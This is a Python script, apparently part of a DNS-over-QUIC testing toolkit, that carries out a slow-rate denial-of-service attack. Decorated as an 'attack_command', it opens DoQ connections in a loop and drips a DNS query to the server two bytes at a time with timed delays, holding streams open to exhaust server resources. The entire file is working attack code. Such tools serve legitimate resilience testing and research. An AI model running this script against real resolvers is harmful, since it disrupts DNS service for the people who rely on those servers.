
import asyncio
import itertools
import logging
import struct
from dnslib.dns import QTYPE, DNSHeader, DNSQuestion, DNSRecord
from aioquic_doq_client import DnsClientProtocol

from utils import attack_command, calculate_slowrate_wait_time, doq_connection_loop

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(name)s:%(message)s', datefmt='%Y-%m-%dT%H:%M:%S')


@attack_command()
@doq_connection_loop()
async def main(addr, con: DnsClientProtocol, *args, **kwargs):
    query = DNSRecord(
        header=DNSHeader(id=0),
        q=DNSQuestion(qname="example.com", qtype=QTYPE.A)
    )
    data = bytes(query.pack())
    data = struct.pack("!H", len(data)) + data

    # Send query
    stream_id = con._quic.get_next_available_stream_id()
    waiter = con._loop.create_future()
    con.query_waiter[stream_id] = waiter
    con.query_parts[stream_id] = b''
    for b in map(bytes, itertools.batched(data[:-2], 2)):
        logging.info(f'Sending DoQ query part: {b}')
        con._quic.send_stream_data(stream_id, data=b)
        con.transmit()
        await asyncio.sleep(calculate_slowrate_wait_time(con._quic))
    con._quic.send_stream_data(stream_id, data=data[-2:], end_stream=True)
    con.transmit()

    # Wait for response
    res = await asyncio.shield(waiter)
    logging.debug(f'Response: {res}')



if __name__ == '__main__':
    main()

